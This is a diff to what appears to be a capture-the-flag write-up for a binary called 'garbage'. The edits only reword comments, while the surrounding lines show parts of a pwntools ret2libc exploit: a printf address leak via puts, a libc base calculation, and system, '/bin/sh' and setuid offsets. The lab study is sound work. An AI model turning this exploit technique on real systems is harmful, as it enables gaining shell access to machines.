@@ -139,7 +139,7 @@ from pwn import *
 
 p = process("./garbage")
 
-# Stage 1 (Obtaining the offset value)
+# Stage 1 (Leaking the address of printf@GLIBC)
 plt_main = p64(0x401619)
 plt_put = p64(0x401050)
 got_printf = p64(0x404048)
@@ -207,7 +207,7 @@ from pwn import *
 
 p = process("./garbage")
 
-# Stage 1 (Obtaining the offset value)
+# Stage 1 (Leaking the address of printf@GLIBC)
 plt_main = p64(0x401619)
 plt_put = p64(0x401050)
 got_printf = p64(0x404048)
@@ -231,11 +231,11 @@ libc_exit   = 0x3dfc0
 libc_sh     = 0x1881ac
 libc_setuid = 0xcbbe0
 
-# Calculate the offset
+# Calculate the the base address of libc
 libc_main = leaked_printf - libc_printf
 log.success("libc_main:" + hex(offset))
 
-# Add the offset to calculate the addresses libc functions
+# Add the offsets to the base address to  obtain the addresses libc functions
 
 sys = p64(libc_main + libc_sys)
 sh = p64(libc_main + libc_sh)
@@ -285,7 +285,7 @@ garbage = ELF("garbage")
 rop = ROP(garbage)
 libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
 
-# Stage 1 (Obtaining the offset value)
+# Stage 1 (Leaking the address of printf@GLIBC)
 junk = "A"*136
 rop.search(regs=['rdi'], order = 'regs')
 rop.puts(garbage.got['printf'])
